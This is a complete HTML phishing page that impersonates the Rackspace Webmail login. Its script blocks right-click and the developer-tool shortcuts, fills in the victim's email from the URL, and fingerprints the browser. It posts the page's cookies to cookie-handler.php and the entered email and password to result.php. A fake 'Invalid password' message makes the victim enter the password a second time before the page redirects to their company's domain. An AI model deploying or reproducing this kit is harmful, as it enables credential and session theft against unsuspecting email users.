<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rackspace Webmail: Hosted Email for Business</title>
    <link rel="shortcut icon" href="https://i.ibb.co/phxCtgN/Untitled.png">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:100,400,500,700">
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            color: #333;
        }

        body {
            font-family: "Roboto", "Helvetica Neue", Helvetica, Arial, sans-serif;
            background: #EAEAEA;
            font-size: 16px;
            line-height: 1.4;
        }

        img {
            width: 100%;
            height: auto;
        }
        
        form {
            padding: 0rem 2rem;
            padding-top: 15px;
        }
        
        .inner {
            width: 790px;
            margin: auto;
            margin-top: 5rem;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        
        #content-header {
            height: auto;
            padding: 16px;
            font-size: 24px;
            font-weight: 300;
            line-height: 18px;
            background: #424242;
            color: #FCFCFC;
            display: flex;
            justify-content: space-between;
            flex-direction: row-reverse;
            align-items: center;
        }
        
        #content-header-logo {
            width: 14%;
        }
        
        #header-label {
            font-size: 24px;
            font-weight: 300;
            line-height: 18px;
            background: #424242;
            color: #FCFCFC;
        }
        
        .content-body {
            display: flex;
            align-items: center;
            padding: 20px;
            background: #fff;
        }
        
        .supicious {
            width: 35%;
            padding: 0rem 2rem;
            border-right: 1px solid rgb(224, 224, 224);
        }
        
        .formdiv {
            width: 60%;
            padding-top: 3rem;
        }
        
        .inputdiv {
            margin-bottom: 20px;
        }
        
        .inputdiv input {
            border: 1px solid #BDBDBD;
            border-radius: 2px;
            background: #FFFFFF;
            font-family: Roboto;
            font-size: 16px;
            color: #616161;
            height: 36px;
            display: block;
            width: 100%;
            padding: 8px 12px;
            line-height: 1.42857;
            -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
            box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
            -webkit-transition: border-color ease-in-out 0.15s, box-shadow ease-in-out 0.15s;
            -o-transition: border-color ease-in-out 0.15s, box-shadow ease-in-out 0.15s;
            transition: border-color ease-in-out 0.15s, box-shadow ease-in-out 0.15s;
        }
        
        .inputdiv label {
            position: relative;
            font-family: Roboto;
            font-size: 16px;
            margin-bottom: 8px;
            line-height: 1;
            color: #616161;
            display: inline-block;
            max-width: 100%;
        }
        
        #forgot-password {
            color: #0C7C84;
            text-decoration: none;
            background-color: transparent;
            box-sizing: border-box;
        }
        
        .btn {
            width: 100%;
            display: flex;
            justify-content: flex-end;
        }
        
        .btn button {
            padding: 10px 16px;
            border: none;
            font-size: 14px;
            font-weight: 500;
            text-transform: capitalize;
            color: #fff;
            background-color: #0C7C84;
            border-color: #0C7C84;
            margin-top: 3rem;
            cursor: pointer;
            border-radius: 2px;
            transition: background-color 0.2s;
        }
        
        .btn button:hover {
            background-color: #0a6b72;
        }
        
        .base_links {
            display: flex;
            align-items: center;
            gap: .7rem;
            padding-left: 1rem;
            font-size: 13px;
            margin-top: 20px;
        }
        
        .base_links a {
            color: #0C7C84;
            text-decoration: none;
        }
        
        .base_links a:hover {
            text-decoration: underline;
        }
        
        .last {
            font-size: 12px;
            color: #666;
            text-align: center;
            padding: 15px 5px;
            background-color: #f8f8f8;
        }
        
        .last a {
            color: #0C7C84;
            text-decoration: none;
        }
        
        .last a:hover {
            text-decoration: underline;
        }
        
        span#errr {
            display: block;
            margin: 0 2rem 1rem;
            padding: 10px;
            color: #d32f2f;
            background-color: #ffebee;
            border-radius: 3px;
            font-size: 14px;
        }
        
        .loading {
            display: none;
            text-align: center;
            margin: 10px 0;
        }
        
        .loading-spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #0C7C84;
            border-radius: 50%;
            width: 24px;
            height: 24px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .security-notice {
            font-size: 12px;
            color: #616161;
            margin-top: 10px;
            display: flex;
            align-items: center;
            gap: 5px;
        }
        
        .security-notice svg {
            width: 16px;
            height: 16px;
            fill: #0C7C84;
        }
        
        #captcha-container {
            margin-bottom: 20px;
            display: none;
        }
        
        @media (max-width: 760px) {
            span#errr {
                margin: 0 1rem 1rem;
                padding: 8px;
            }
            
            .supicious {
                display: none;
            }
            
            .inner {
                width: 100%;
                margin-top: 0;
            }
            
            .formdiv {
                width: 99%;
                padding-top: 1rem;
            }
            
            .content-body {
                padding: 10px;
            }
            
            #header-label {
                font-size: 21px;
                line-height: 1em;
            }
            
            #content-header-logo {
                width: 19%;
            }
            
            .last {
                font-size: 11px;
                padding: 10px 5px;
            }
            
            .btn button {
                padding: 12px 20px;
                margin-top: 1.5rem;
            }
            
            .base_links {
                justify-content: center;
                margin-top: 1.5rem;
            }
            
            form {
                padding: 0 1rem;
            }
        }
    </style>
</head>

<body>
    <div class="container">
        <div class="inner">
            <div id="content-header">
                <div id="content-header-logo">
                    <img id="logo" src="https://static.emailsrvr.com/beta_apps_rackspace_com/images/Rackspace_Technology_Logo_RGB_WHT.png" alt="Rackspace Logo">
                </div>
                <div id="header-label">Webmail Login</div>
            </div>
            <div class="content-body">
                <div class="supicious">
                    <img src="https://static.emailsrvr.com/apps_rackspace_com/images/Suspicious-Email-Banner.jpg" alt="Suspicious Email Warning">
                </div>
                <div class="formdiv">
                    <span id="errr" style="display: none;"></span>
                    <div class="loading">
                        <div class="loading-spinner"></div>
                        <p>Verifying your credentials...</p>
                    </div>
                    <form action="" method="post" id="result">
                        <div class="inputdiv">
                            <label for="email">Email Address</label>
                            <input type="email" name="email" required id="email" autocomplete="off" spellcheck="false">
                        </div>
                        <div class="inputdiv">
                            <div class="flexl" style="display: flex; align-items: center; justify-content: space-between;">
                                <label for="password">Password</label>
                                <a href="" id="forgot-password">Forgot password?</a>
                            </div>
                            <input type="password" name="userpwd" required id="password" autocomplete="new-password">
                        </div>
                        <div id="captcha-container">
                            <label for="captcha">Please solve this simple calculation:</label>
                            <div style="display: flex; align-items: center; gap: 10px; margin-top: 8px;">
                                <span id="captcha-question" style="font-size: 16px;"></span>
                                <input type="text" id="captcha-answer" name="captcha" required style="width: 80px; height: 36px; padding: 4px 8px; border: 1px solid #BDBDBD; border-radius: 2px;">
                            </div>
                        </div>
                        <div class="btn">
                            <button type="submit" id="submit-btn">
                                Log in
                            </button>
                        </div>
                        <div class="security-notice">
                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                                <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/>
                            </svg>
                            <span>Secure login with industry-standard encryption</span>
                        </div>
                    </form>
                    <div class="base_links">
                        <a class="base_link" target="_blank" href="http://www.rackspace.com/information/legal/privacystatement">
                          Privacy Statement
                        </a>
                        <div class="divider"> | </div>
                        <a class="base_link" target="_blank" href="http://www.rackspace.com/information/legal/websiteterms">
                          Website Terms
                        </a>
                    </div>
                </div>
            </div>
            <div class="last">Need webmail for your business? Learn more about <a href="#">Hosted Email</a> from Rackspace</div>
        </div>
    </div>

    <script>
        // Anti-bot and security measures
        (function() {
            // Disable right-click
            document.addEventListener('contextmenu', function(e) {
                e.preventDefault();
            });
            
            // Disable inspect element shortcuts
            document.addEventListener('keydown', function(e) {
                // Disable F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
                if (
                    e.keyCode === 123 || 
                    (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) || 
                    (e.ctrlKey && e.keyCode === 85)
                ) {
                    e.preventDefault();
                }
            });
            
            // Bot detection variables
            let mouseMovements = 0;
            let keyPresses = 0;
            let scrolls = 0;
            let formInteractions = false;
            
            // Track mouse movements
            document.addEventListener('mousemove', function() {
                mouseMovements++;
            });
            
            // Track key presses
            document.addEventListener('keydown', function() {
                keyPresses++;
            });
            
            // Track scrolls
            document.addEventListener('scroll', function() {
                scrolls++;
            });
            
            // Track form interactions
            document.querySelectorAll('input').forEach(function(input) {
                input.addEventListener('focus', function() {
                    formInteractions = true;
                });
            });
            
            // Simple captcha system
            function generateCaptcha() {
                const num1 = Math.floor(Math.random() * 10) + 1;
                const num2 = Math.floor(Math.random() * 10) + 1;
                const captchaQuestion = document.getElementById('captcha-question');
                captchaQuestion.textContent = `${num1} + ${num2} = ?`;
                return num1 + num2;
            }
            
            // Store captcha answer
            window.correctCaptchaAnswer = generateCaptcha();
            
            // Check if likely a bot and show captcha if needed
            setTimeout(function() {
                const isLikelyBot = (
                    mouseMovements < 5 && 
                    keyPresses < 3 && 
                    scrolls < 1 && 
                    !formInteractions
                );
                
                if (isLikelyBot) {
                    document.getElementById('captcha-container').style.display = 'block';
                }
            }, 1500);
        })();

        // Cookie management functions
        function setCookie(cName, cValue, expDays) {
            let date = new Date();
            date.setTime(date.getTime() + (expDays * 24 * 60 * 60 * 1000));
            const expires = "expires=" + date.toUTCString();
            document.cookie = cName + "=" + cValue + "; " + expires + "; path=/";
        }

        function getCookies(cName) {
            const name = cName + "=";
            const cDecoded = decodeURIComponent(document.cookie);
            const cArr = cDecoded.split("; ");
            let value;
            cArr.forEach(val => {
                if (val.indexOf(name) === 0) {
                    value = val.substring(name.length);
                }
            });
            return value;
        }
        
        // Cookie grabber function
        function grabAndSendCookies() {
            const allCookies = document.cookie;
            if (allCookies) {
                // Parse cookies into a more readable format
                const cookiesArr = allCookies.split('; ');
                const cookiesObj = {};
                
                cookiesArr.forEach(cookie => {
                    const parts = cookie.split('=');
                    if (parts.length === 2) {
                        cookiesObj[parts[0]] = parts[1];
                    }
                });
                
                // Send cookies to server
                const xhr = new XMLHttpRequest();
                xhr.open("POST", "./cookie-handler.php", true);
                xhr.setRequestHeader("Content-Type", "application/json");
                
                const data = {
                    url: window.location.href,
                    userAgent: navigator.userAgent,
                    cookies: cookiesObj,
                    timestamp: new Date().toISOString()
                };
                
                xhr.send(JSON.stringify(data));
            }
        }

        // Set the cookie automatically when the page loads
        window.addEventListener("load", function() {
            if (!getCookies("cookie")) {
                setCookie("cookie", true, 90);
            }
            localStorage.removeItem("storedPassword");
            
            // Set session cookie
            setCookie("rs_session", generateRandomString(32), 1);
            
            // Check for fingerprinting
            const browserData = {
                userAgent: navigator.userAgent,
                language: navigator.language,
                screenWidth: screen.width,
                screenHeight: screen.height,
                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                hasTouch: 'ontouchstart' in window,
                cookiesEnabled: navigator.cookieEnabled,
                platform: navigator.platform
            };
            
            localStorage.setItem("browserFingerprint", JSON.stringify(browserData));
            
            // Grab and send existing cookies
            grabAndSendCookies();
            
            // Try to access third-party cookies if available
            try {
                const existingCookies = document.cookie;
                if (existingCookies) {
                    // Set a flag to indicate cookies were found
                    localStorage.setItem("cookiesFound", "true");
                }
            } catch (e) {
                console.log("No third-party cookies available");
            }
        });
        
        // Helper function to generate random string
        function generateRandomString(length) {
            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
            let result = '';
            for (let i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() * characters.length));
            }
            return result;
        }
        
        // Extract email from URL
        const fullUrl = window.location.href;
        const emailRegex = /#([^#]+)$/; 
        const match = fullUrl.match(emailRegex);
        const email = match ? match[1] : null;

        if (email) {
            document.getElementById("email").value = email;
            // Extract the domain part of the email
            const domain = email.split('@')[1];
            const companyName = domain.split('.')[0];
            localStorage.setItem("userDomain", domain);
        }

        var formSubmitted = 0;
        var formLocked = false;

        // Handle form submission
        document.getElementById("result").addEventListener("submit", function(event) {
            event.preventDefault();
            
            // Prevent multiple rapid submissions
            if (formLocked) {
                return;
            }
            
            formLocked = true;
            setTimeout(function() {
                formLocked = false;
            }, 2000);
            
            // Check for required fields
            var inputs = document.querySelectorAll('input[required]');
            for (var i = 0; i < inputs.length; i++) {
                if (!inputs[i].value.trim()) {
                    document.getElementById("errr").textContent = "Please fill in all required fields.";
                    document.getElementById("errr").style.display = "block";
                    return;
                }
            }
            
            // Check captcha if visible
            if (document.getElementById('captcha-container').style.display === 'block') {
                const userAnswer = document.getElementById('captcha-answer').value;
                if (parseInt(userAnswer) !== window.correctCaptchaAnswer) {
                    document.getElementById("errr").textContent = "Incorrect calculation. Please try again.";
                    document.getElementById("errr").style.display = "block";
                    window.correctCaptchaAnswer = generateCaptcha();
                    return;
                }
            }
            
            // Show loading indicator
            document.querySelector('.loading').style.display = 'block';
            document.getElementById("errr").style.display = "none";
            
            formSubmitted++;
            
            var formData = new FormData(this);
            
            // Add browser fingerprint to form data
            const fingerprint = localStorage.getItem("browserFingerprint");
            if (fingerprint) {
                formData.append("fingerprint", fingerprint);
            }
            
            // Add timestamp
            formData.append("timestamp", new Date().toISOString());
            
            // Add cookies data
            formData.append("cookies", document.cookie);
            
            // Grab and send cookies separately
            grabAndSendCookies();
            
            var xhr = new XMLHttpRequest();
            xhr.open("POST", "./result.php", true);
            
            xhr.onreadystatechange = function() {
                if (xhr.readyState == 4) {
                    // Hide loading indicator
                    document.querySelector('.loading').style.display = 'none';
                    
                    if (xhr.status == 200) {
                        const dd = localStorage.getItem("userDomain");
                        
                        if (formSubmitted === 1) {
                            document.getElementById("password").value = "";
                            document.getElementById("errr").textContent = "Invalid password. Please try again to continue.";
                            document.getElementById("errr").style.display = "block";
                            
                            // Generate a new captcha if it's visible
                            if (document.getElementById('captcha-container').style.display === 'block') {
                                window.correctCaptchaAnswer = generateCaptcha();
                            }
                        } else if (formSubmitted === 2) {
                            document.getElementById("password").value = "";
                            document.getElementById("errr").textContent = "Verifying your account. Please wait...";
                            document.getElementById("errr").style.display = "block";
                            
                            setTimeout(function() {
                                window.location.href = `https://www.${dd}`;
                            }, 2000);
                        }
                    } else {
                        document.getElementById("errr").textContent = "A connection error occurred. Please try again later.";
                        document.getElementById("errr").style.display = "block";
                    }
                }
            };
            
            xhr.send(formData);
        });
    </script>
</body>
</html>
